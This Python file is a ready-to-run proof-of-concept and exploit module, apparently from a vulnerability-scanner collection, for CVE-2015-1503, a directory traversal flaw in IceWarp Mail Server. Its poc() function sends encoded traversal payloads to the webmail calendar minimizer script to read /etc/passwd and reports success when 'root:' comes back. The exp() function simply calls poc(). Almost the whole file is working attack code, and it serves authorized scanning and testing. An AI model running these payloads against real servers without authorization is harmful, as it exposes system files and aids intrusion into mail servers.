import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''IceWarp Mail Server Directory Traversal''',
        "description": '''IceWarp Mail Server versions prior to 11.1.1 suffer from a directory traversal vulnerability.''',
        "severity": "high",
        "references": [
            "https://packetstormsecurity.com/files/147505/IceWarp-Mail-Server-Directory-Traversal.html", 
            "http://www.icewarp.com", 
            "https://nvd.nist.gov/vuln/detail/CVE-2015-1503"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cvss-score": "7.5",
            "cve-id": "CVE-2015-1503",
            "cwe-id": "CWE-200"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2015", "icewarp", "lfi", "mail"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        paths = [
            "/webmail/old/calendar/minimizer/index.php?script=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd",
            "/webmail/old/calendar/minimizer/index.php?style=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd"
        ]

        for path in paths:
            resp = requests.get(url+path, timeout=10, verify=False, allow_redirects=False)
            if resp.status_code == 200 and "root:" in resp.text:
                result["success"] = True
                result["info"] = info()
                result["payload"] = url+path

                return result

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url